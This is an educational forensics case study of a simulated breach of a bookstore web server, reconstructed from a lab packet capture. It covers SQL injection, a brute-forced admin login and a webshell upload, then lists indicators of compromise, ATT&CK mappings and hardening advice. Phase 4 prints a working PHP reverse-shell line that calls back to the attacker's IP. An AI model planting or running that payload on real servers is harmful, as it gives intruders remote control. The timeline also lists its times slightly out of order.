# DFIR Case Study: IoT & Enterprise Network Breach Investigation (BookWorld)

## Overview

This case study documents a forensic investigation of a multi-stage network breach against a simulated e-commerce server (`bookworldstore.com`, IP: `73.124.22.98`). The investigation was conducted by analyzing a provided PCAP file using Wireshark and supporting tools to reconstruct the full attack chain, from initial reconnaissance through to complete server compromise.

The attacker executed a sophisticated, multi-phase attack combining SQL injection, brute force credential attacks, and PHP webshell deployment to gain full control of the target server.

---

## Tools Used

- **Wireshark** — Primary network forensic analysis and packet capture review
- **tshark** — Command-line packet filtering and analysis
- **NetworkMiner** — Artifact and credential extraction
- **WHOIS / GeoIP** — External IP attribution and attacker geolocation

---

## Executive Summary

On March 15, 2024, the server `bookworldstore.com` was compromised through a series of escalating attacks. The threat actor, operating from IP `111.224.250.131` (Linux-based system), began with automated SQL injection using sqlmap, progressed to brute forcing admin credentials, and ultimately uploaded a PHP reverse shell to establish persistent remote access over port 443.

---

## Attack Timeline

| Time | Phase | Evidence |
|------|-------|----------|
| 17:08:34 | Normal traffic | TCP and HTTP requests, slightly anomalous volume |
| 17:08:12 | SQL injection begins | sqlmap/1.8.3 detected in User-Agent |
| 17:08:39 | Data exfiltration | Database contents extracted via SQLi |
| 17:13:14 | Brute force | Repeated POST requests to `/admin/login.php` |
| 17:17:35 | Authentication bypass | Login successful with `admin:admin123!` |
| 17:24:18 | Post-exploitation | Malicious PHP file uploaded to server |

---

## Investigation Walkthrough

### Phase 1: Reconnaissance & Initial Scanning

The first suspicious activity was an external IP (`170.40.150.126`, Windows-based) attempting repeated TCP connections to the target server on sequential ports (54854, 54855, etc.), all of which were rejected. This pattern is consistent with automated port scanning.

Shortly after, the primary attacker IP (`111.224.250.131`) began sending high volumes of HTTP requests within milliseconds, triggering 403 and 404 responses — a clear indicator of web application enumeration. A 507 error (Insufficient Storage) also appeared mid-scan, suggesting the volume of requests briefly impacted server resources.

### Phase 2: SQL Injection & Database Exfiltration

The attacker used **sqlmap 1.8.3** to target the admin panel at `/admin/login.php`. By following the TCP stream in Wireshark, the full SQL injection payload and the server's database responses were visible in plaintext, confirming successful extraction of database contents including book inventory and potentially customer records.

The fact that the attack used HTTP without encryption meant the entire payload and response were fully reconstructable from the PCAP alone.

### Phase 3: Brute Force & Credential Compromise

After extracting database information, the attacker pivoted to brute forcing the admin login page. Repeated POST requests to `/admin/login.php` with varying credentials were observed in the packet capture. The attack succeeded when the attacker authenticated using:

- **Username:** `admin`
- **Password:** `admin123!`

This highlights a critical weakness — a predictable, weak password on a privileged account with no account lockout policy in place.

### Phase 4: Webshell Upload & Full Compromise

With admin access established, the attacker navigated to `/admin/index.php` and uploaded a malicious PHP file containing a reverse shell payload:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'"); ?>
```

This payload established an outbound reverse shell connection back to the attacker's machine over **port 443 (HTTPS)** — a common technique used to blend malicious traffic with legitimate HTTPS traffic and bypass firewall rules.

At this point the server was fully compromised, giving the attacker remote command execution with web server privileges.

---

## Indicators of Compromise (IOCs)

| Indicator | Type | Description |
|-----------|------|-------------|
| `111.224.250.131` | IP Address | Primary attacker (Linux) |
| `170.40.150.126` | IP Address | Secondary scanner (Windows) |
| `sqlmap/1.8.3#stable` | User-Agent | SQL injection tool signature |
| `/admin/login.php` | URL | Brute forced endpoint |
| `/admin/index.php` | URL | Webshell upload endpoint |
| `TCP 443` | Port | Reverse shell C2 channel |

---

## MITRE ATT&CK Mapping

| Technique | Tactic | ID |
|-----------|--------|----|
| Exploit Public-Facing Application (SQLi) | Initial Access | T1190 |
| Brute Force | Credential Access | T1110 |
| Web Shell | Persistence | T1505.003 |
| Data from Local System | Collection | T1005 |
| Exfiltration Over C2 Channel | Exfiltration | T1041 |
| Encrypted Channel (Port 443) | Command & Control | T1573 |

---

## Recommendations

The root causes of this breach were a combination of unvalidated user input, weak credentials, and missing security controls. Each attack phase could have been stopped with basic hardening measures.

**SQL Injection Prevention:**
- Implement parameterized queries and prepared statements across all database interactions
- Deploy a Web Application Firewall (WAF) to detect and block sqlmap signatures
- Disable detailed error messages that reveal database structure

**Credential Security:**
- Enforce strong password policies for all admin accounts
- Implement account lockout after 3-5 failed login attempts
- Enable Multi-Factor Authentication (MFA) on all privileged accounts

**File Upload Security:**
- Restrict uploads to an allowlist of safe file extensions
- Store uploaded files outside the web root in a non-executable directory
- Scan uploaded files for malicious content before processing

**Network Controls:**
- Block unnecessary inbound traffic from external IPs
- Monitor for unusual outbound connections, especially on port 443 to unknown destinations
- Deploy IDS/IPS rules to detect reverse shell patterns and sqlmap signatures

---

> **Disclaimer:** This investigation was performed on a provided lab PCAP file in a controlled educational environment. All findings are simulated for learning purposes only.
